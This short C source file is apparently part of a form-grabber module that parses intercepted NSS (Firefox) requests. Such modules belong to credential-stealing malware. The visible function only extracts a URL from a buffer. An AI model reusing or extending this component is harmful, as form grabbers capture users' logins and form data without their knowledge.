#include "httpgrabber.h"

#ifdef MODULE_FORMGRABBER
#include "../common/httptools.h"

BOOL ParseNss3RequestFromBuffer(nss3_request_t* pRequest, const LPSTR pszBuffer)
{
	pRequest->url = ParseURLFromBuffer(pszBuffer);

	return pRequest->url != NULL;
}

#endif